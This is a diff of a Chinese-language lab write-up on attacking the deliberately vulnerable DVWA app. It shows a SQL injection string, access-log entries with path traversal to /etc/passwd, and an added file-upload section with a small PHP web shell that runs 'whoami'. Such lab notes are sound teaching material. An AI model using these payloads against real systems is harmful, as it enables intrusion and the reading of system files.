@@ -63,6 +63,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
 
 - 有漏洞本地文件測試
 ![file_inclusion_1.PNG](images/file_inclusion_attack.PNG)
+***
 #### cat /var/log/apache2/access.log
 ```
 192.168.10.59 - - [12/Feb/2016:04:30:54 +0800] "GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1" 200 811 "http://120.114.140.30/DVWA/vulnerabilities/fi/?page=../../../../etc/passwd" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
@@ -77,4 +78,20 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
 192.168.10.59 - - [12/Feb/2016:04:31:07 +0800] "GET /DVWA/dvwa/images/logo.png HTTP/1.1" 200 5332 "http://120.114.140.30/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
 192.168.10.59 - - [12/Feb/2016:04:31:07 +0800] "GET /DVWA/dvwa/css/main.css HTTP/1.1" 200 1447 "http://120.114.140.30/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
 ```
+### 4.  測試DVWA/File Upload
+上傳的文件對應用程序造成重大風險。許多攻擊的第一步是向系統獲取一些攻擊代碼。那麼攻擊只需要找到一種方法來執行代碼
+- 撰寫有代碼的攻擊檔案
+```php
+<?php
+	echo exec('whoami');
+?>
+```
+- 上傳具有攻擊的檔案
+![file_upload_1.PNG](images/file_upload_1.PNG)
 
+- 成功上傳
+![file_upload_2.PNG](images/file_upload_2.PNG)
+- 執行上傳後的檔案
+![file_upload_3.PNG](images/file_upload_3.PNG)
+
+***
